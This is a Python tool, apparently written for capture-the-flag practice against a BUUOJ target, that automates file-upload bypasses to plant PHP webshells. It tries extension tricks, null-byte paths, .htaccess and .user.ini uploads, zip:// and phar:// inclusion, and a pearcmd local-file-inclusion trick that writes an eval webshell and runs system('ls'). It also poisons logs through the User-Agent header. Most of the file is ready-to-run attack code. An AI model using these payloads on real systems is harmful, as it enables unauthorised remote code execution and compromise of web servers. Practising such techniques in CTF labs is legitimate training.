"""
TODO: 完成params传参
0. 先用 web_format_bp_requests.py 格式化 burp 的请求为 python, 再替换对应参数。然后用下面逐个测试
1. 如果有 $_GET['xxx']，填写对应 lfi 参数 ,并注释掉下一行

3. 复制来的请求 要删除   header中   "Content-Type": "multipart/form-data; bou
3. upload4_percent00_pass11 可能需要修改对应参数
4. upload5_pass12
"""
import inspect
from urllib.parse import urlparse

from requests_html import HTMLSession

import requests

session = HTMLSession()


def _get_host(url):
    parsed_url = urlparse(url)
    host_with_protocol = parsed_url.scheme + "://" + parsed_url.netloc
    return host_with_protocol


url = 'http://e4fa15e6-cb47-4662-bde1-0378676675a3.node4.buuoj.cn:81/'
files = {'file': ['check.gif', 'filedata_or_fp', 'image/gif']}
data = {'submit': 'Upload!!!'}
upload_folder = 'uploads'
success_message = 'success'
lfi_url = '/1.php?file='
lfi_url = ''
host = _get_host(url)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080', }
proxies = {}
headers = {}
xpath_upload_url = "//div[@id='img']/img/@src"
xpath_upload_url = ""


class FuzzUpload:
    upload_url = ''

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        # self.requests = HTMLSession()
        self.requests = session
        self.requests.headers = headers

    def send_request(self, url, files, data):
        post_data = data.copy()
        post_files = files.copy()
        res = self.requests.post(url, data=post_data, files=post_files, proxies=proxies)

        if xpath_upload_url:
            xpath_lst = res.html.xpath(xpath_upload_url)
            if xpath_lst:
                self.upload_url = xpath_lst[0]
            else:
                print('没有上传成功')
        return res

    def check(self, shell_path=None, check_str='Hello 123', absolute=False, res=None):
        def check_by_status_code(res_check, shell_path):
            if res_check.status_code == 200:
                surl = self.get_final_url_path(shell_path)
                print('Done: ' + shell_path)
                print(f'url: {surl}')
            else:
                print('error ', shell_path)
            return

        absolute = absolute or shell_path.startswith('http')
        if absolute:
            tmp_url = shell_path
        else:
            tmp_url = self.get_upload_url(shell_path)

        if res and success_message in res.text:
            print(f'success: {shell_path}\nurl: {tmp_url}')
            return True

        if shell_path:
            res_check = requests.get(tmp_url)
            if check_str:
                return check_str in res_check.text
            check_by_status_code(res_check, shell_path)

        return False

    def get_final_url_path(self, shell_path):
        r = url.rsplit('/', 1)[0]
        shell_url = r + '/' + shell_path
        return shell_url

    def get_upload_url(self, shell_path):
        updir = f'{upload_folder}/' if upload_folder else ''
        url = f'{host}/{updir}{shell_path}'
        return url

    def _update_file_fp(self, file_path, filename='file.pHP'):
        f = open(file_path, 'rb')
        post_files = files.copy()
        # post_files = {'upload_file': ('file.pHP', f, 'image/jpeg')} 更新中间的f值为实际文件 fp
        key0 = list(post_files.keys())[0]
        post_files[key0] = [filename, f, 'image/jpeg']  # 需要更新 1: f 索引为实际索引
        return post_files

    def upload0_normal_check(self):
        file_path = 'check.gif'
        post_files = self._update_file_fp(file_path, filename='check.gif')
        post_data = data.copy()
        res = self.send_request(url=url, files=post_files, data=post_data)
        self.check(self.upload_url or file_path, 'GIF89a')

    def upload1_basic(self):
        print("Function name:", inspect.currentframe().f_code.co_name)
        file_path = 'basic.PHp'
        post_files = self._update_file_fp(file_path)
        post_data = data.copy()
        try:
            res = self.send_request(url=url, files=post_files, data=post_data)
            self.check(self.upload_url or file_path)
        except Exception as e:
            print('error ', file_path)

    def upload2_php5_phtml(self):
        print("Function name:", inspect.currentframe().f_code.co_name)
        fmap = {'Php::$DATA': 'Php'}
        filename = 'basic.PHp'
        ext_lst = 'PHP,Php::$DATA,pphphp,pHP,pHP.,pHP ,pHP. .,pHP3,pHP4,pHP5,pHP%00.jpg,phtml'.split(
            ',')  # "basic.pHP .jpg"
        ext_lst = 'pHP%00.jpg,phtml'.split(',')  # "basic.pHP .jpg"
        for ext in ext_lst:
            newname = f'basic.{ext}'
            post_files = self._update_file_fp(filename, filename=newname)
            post_data = data.copy()
            res = self.send_request(url=url, files=post_files, data=post_data)
            if self.check(self.upload_url and self.upload_url.rstrip('::$data') or newname):
                print('success ext is ', ext)
                return
        return

    def upload2_1_script_language(self, shell=None):
        print("Function name:", inspect.currentframe().f_code.co_name)
        file_path = 'basic4_scriptlanguage.PHp'
        post_files = self._update_file_fp(file_path, filename=shell or file_path)
        post_data = data.copy()
        try:
            res = self.send_request(url=url, files=post_files, data=post_data)
            self.check(shell or file_path)
        except Exception as e:
            print('error ', file_path)

    def upload2_2_upload_zip(self, shell=None):
        print("Function name:", inspect.currentframe().f_code.co_name)
        file_path = 'basic.zip'
        post_files = self._update_file_fp(file_path, filename=shell or file_path)
        post_data = data.copy()
        try:
            res = self.send_request(url=url, files=post_files, data=post_data)
            # self.check(shell or file_path)
            url1 = f'{host}{lfi_url}zip://{upload_folder}/basic.jpg%23basic.php'
            url2 = f'{host}{lfi_url}zip://{upload_folder}/basic.jpg%23basic'
            url3 = f'{host}{lfi_url}phar://{upload_folder}/basic.jpg/basic.php'
            url4 = f'{host}{lfi_url}phar://{upload_folder}/basic.jpg/basic'
            if self.check(url1, check_str='GIF89a'): print(url1)
            if self.check(url2, check_str='GIF89a'): print(url2)
            if self.check(url3, check_str='GIF89a'): print(url3)
            if self.check(url4, check_str='GIF89a'): print(url4)
        except Exception as e:
            print('error ', file_path)

    def upload2_3_pearcmd(self, shell=None):
        import urllib.request, urllib.error
        def send_get_request(url):
            try:
                response = urllib.request.urlopen(url)
                # print(response.read())
            except urllib.error.URLError as e:
                print(f"请求发生错误: {e.reason}")

        url = f'''{host}{lfi_url}/usr/local/lib/php/pearcmd&+config-create+/'<?=@eval($_GET[1]);?>'+./shell.php'''
        send_get_request(url)

        final_url1 = host + "/shell.php?1=system('ls');"
        res = requests.get(final_url1)
        if 'php' in res.text: print(f'final_url1: {final_url1}')

        url = f'''{host}{lfi_url}/usr/local/lib/php/pearcmd.php&+config-create+/'<?=@eval($_GET[1]);?>'+./shell1.php'''
        send_get_request(url)

        final_url2 = host + "/shell1.php?1=system('ls');"
        res = requests.get(final_url2)
        if 'php' in res.text: print(f'final_url2: {final_url2}')

    def upload3_htaccess(self):
        print("Function name:", inspect.currentframe().f_code.co_name)

        file_path = '.htaccess'
        post_files = self._update_file_fp(file_path, filename=file_path)
        post_data = data.copy()
        # upload .htaccess
        res = self.send_request(url=url, files=post_files, data=post_data)
        bflag = self.check(self.upload_url or file_path, res=res)
        if bflag:
            print('可以上传图片马')
        return bflag

    def upload3_htaccess_only_jpg(self):
        print("Function name:", inspect.currentframe().f_code.co_name)

        file_path = '.htaccess.jpg'
        post_files = self._update_file_fp(file_path, filename='.htaccess')
        post_data = data.copy()
        # upload .htaccess
        res = self.send_request(url=url, files=post_files, data=post_data)
        bflag = self.check(self.upload_url or file_path, res=res)
        if bflag:
            print('可以上传图片马')

    def upload4_percent00_pass11(self):
        print("Function name:", inspect.currentframe().f_code.co_name)
        file_path = 'basic.gif'
        post_files = self._update_file_fp(file_path, file_path)
        post_data = data.copy()
        url1 = url + '?save_path=../upload/55.pHP%00.jpg'
        try:
            res = self.send_request(url=url1, files=post_files, data=post_data)
            self.check(self.upload_url or file_path)
        except Exception as e:
            print('error ', file_path)

    def upload5_pass12(self):
        print("Function name:", inspect.currentframe().f_code.co_name)
        file_path = 'basic.gif'
        post_files = self._update_file_fp(file_path, file_path)
        post_data = data.copy()
        post_data['save_path'] = '../upload/basic.php\x00'
        try:
            res = self.send_request(url=url, files=post_files, data=post_data)
            self.check(self.upload_url or file_path)
        except Exception as e:
            print('error ', file_path)

    def upload5_pass13_file_include_gif(self):
        print("Function name:", inspect.currentframe().f_code.co_name)
        file_path = '18135.gif'
        post_files = self._update_file_fp(file_path, file_path)
        post_data = data.copy()
        res = self.send_request(url=url, files=post_files, data=post_data)
        url1 = _get_host(url) + f'/include.php?file=any/{self.upload_url}'
        self.check(url1, absolute=True)

    def upload3_userini(self):
        print("Function name:", inspect.currentframe().f_code.co_name)

        file_path = '.user.ini'
        post_files = self._update_file_fp(file_path, filename=file_path)
        post_data = data.copy()
        # upload .htaccess
        res = self.send_request(url=url, files=post_files, data=post_data)

        check_url = self.get_upload_url('.user.ini')
        check_res = self.requests.get(check_url, proxies=proxies)
        if check_res.status_code != 404:
            print('可以上传图片马 .user.ini ', open(file_path).read())
            return True
        return False

    def upload3_userini_process_payload(self):
        ...

    def upload3_userini1(self):
        print("Function name:", inspect.currentframe().f_code.co_name)

        file_path = '.user1.ini'
        post_files = self._update_file_fp(file_path, filename='.user.ini')
        post_data = data.copy()
        # upload .htaccess
        res = self.send_request(url=url, files=post_files, data=post_data)

        check_url = self.get_upload_url('.user.ini')
        check_res = self.requests.get(check_url, proxies=proxies)
        if check_res.status_code != 404:
            print('php://input, body发送 <?php phpinfo();?>', open(file_path).read())
            return True
        return False

    def upload3_userini1_process_payload(self):
        return

    def upload3_userini2(self):
        print("Function name:", inspect.currentframe().f_code.co_name)

        file_path = '.user2.ini'
        post_files = self._update_file_fp(file_path, filename='.user.ini')
        post_data = data.copy()
        # upload .htaccess
        res = self.send_request(url=url, files=post_files, data=post_data)

        check_url = self.get_upload_url('.user.ini')
        check_res = self.requests.get(check_url, proxies=proxies)
        if check_res.status_code != 404:
            print('/var/log/nginx/access.log .user.ini', open(file_path).read())
            return True
        return False

    def upload3_userini2_process_payload(self):
        headers = {
            'User-Agent': '<?php phpinfo();?>'
        }
        res = self.requests.get(url=url, headers=headers, proxies=proxies)
        res = self.requests.get(url=url, proxies=proxies)
        is_success = 'PHP Version' in res.text
        if is_success:
            print(f"upload3_userini2_process_payload result:: {is_success}")
            print('可以使用一句话木马进行请求了')


def login():
    burp0_url = "http://127.0.0.1:80/dashboard/login.php"
    burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
                     "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1",
                     "Origin": "http://127.0.0.1", "Content-Type": "application/x-www-form-urlencoded",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                     "Sec-Fetch-Dest": "document", "Referer": "http://127.0.0.1/dashboard/login.php",
                     "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    burp0_data = {"username": "admin", "password": "admin"}
    session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    res = session.get('http://127.0.0.1/dashboard/add-service.php')
    print(res.text)


if __name__ == '__main__':
    # login()
    fuzz_upload = FuzzUpload()
    # fuzz_upload.upload0_normal_check()
    # fuzz_upload.upload1_basic()
    # fuzz_upload.upload2_1_script_language()
    # fuzz_upload.upload2_php5_phtml()
    # 成功后上传图片马即可
    # if fuzz_upload.upload3_userini(): fuzz_upload.upload3_userini_process_payload()
    # if fuzz_upload.upload3_userini1(): fuzz_upload.upload3_userini1_process_payload()
    # if fuzz_upload.upload3_userini2(): fuzz_upload.upload3_userini2_process_payload()
    # b_htaccess = fuzz_upload.upload3_htaccess()  # 成功后上传图片马即可
    # fuzz_upload.upload3_htaccess_only_jpg()  # 成功后上传图片马即可
    # fuzz_upload.upload4_percent00_pass11()
    # fuzz_upload.upload5_pass12()
    # fuzz_upload.upload5_pass13_file_include_gif()

    # if b_htaccess:
    #     fuzz_upload.upload2_1_script_language(shell='basic.jpg')
    if lfi_url:
        print('test file=php://filter/convert.base64-encode/resource=upload.php')
        fuzz_upload.upload2_2_upload_zip(shell='basic.jpg')
        fuzz_upload.upload2_3_pearcmd()
